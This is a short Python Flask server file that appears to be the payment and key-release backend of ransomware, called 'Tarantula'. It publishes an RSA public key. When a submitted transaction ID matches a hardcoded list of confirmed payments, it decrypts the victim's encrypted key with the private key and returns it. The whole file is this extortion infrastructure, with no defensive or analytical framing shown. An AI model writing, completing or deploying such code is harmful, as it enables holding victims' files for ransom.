from flask import Flask, request, jsonify
from tinydb import TinyDB, Query
from db import *
from netlib import *
from crypto import *

if (os.path.exists("public-key.pub") == False):
    generate_rsa_key_pairs()

server = Flask("My Shiny Tarantula Server")
# server.logger.disabled = True
db = Database("tarantula.json", "./")

confirmedTransactions = [
    '8cf9637de652a773bf61883283958e76912fb0e1b8c5fd1c175a609df6a80bc4',
    '4558769059f3cc90e0251d2ae5bac26352daa813333f55a2e1850beca2fe456d',
    '01e02a533b37dfe20df1d8d1169e7aaa83d89f9f0509452907fd59ecf7e248ff'
]

@server.route('/api/v1/get_public_key', methods=['GET'])
def get_public_key():
    return jsonify({"public_key": read_public_key("public-key.pub")})

@server.route('/api/v1/payment_check', methods=['POST'])
def payment_check():
    transactionId = request.json['transactionId']
    encryptedKey = request.json['encryptedKey']
    if (transactionId in confirmedTransactions):
        queryResult = db.query("transactions", Query().id == transactionId)
        if (len(queryResult) > 0):
            return jsonify({
                "status": "error",
                "message": "Transaction already exists"
            })
        else:
            private_key = read_private_key("private-key.pem")
            decryptedKey = rsa_decrypt(encryptedKey, private_key)
            db.insert("transactions", {
                "id": transactionId,
                "encryptedKey": encryptedKey,
                "key": decryptedKey
            })
            return jsonify({
                "status": "success",
                "key": decryptedKey.decode()
            })
    else:
        return jsonify({
            "status": "error",
            "message": "Transaction is not confirmed"
        })

server.run(host=get_my_ip_address(), port=9990)